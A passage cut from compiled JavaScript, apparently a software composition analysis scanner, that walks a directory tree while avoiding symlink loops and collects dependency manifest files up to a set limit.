                        isFile = entry.isFile();
                    }
                }
                catch {
                    continue;
                }
                if (isDir) {
                    try {
                        const real = fs.realpathSync(full);
                        if (visitedRealPaths.has(real))
                            continue;
                        visitedRealPaths.add(real);
                    }
                    catch { }
                    stack.push({ dirPath: full, depth: current.depth + 1 });
                }
                else if (isFile) {
                    if (manifests.has(name.toLowerCase())) {
                        results.push(full);
                        if (results.length >= maxManifests)
                            break;
                    }
                }
            }
        }
        return results;
    }
}
//# sourceMappingURL=scaScanner.js.map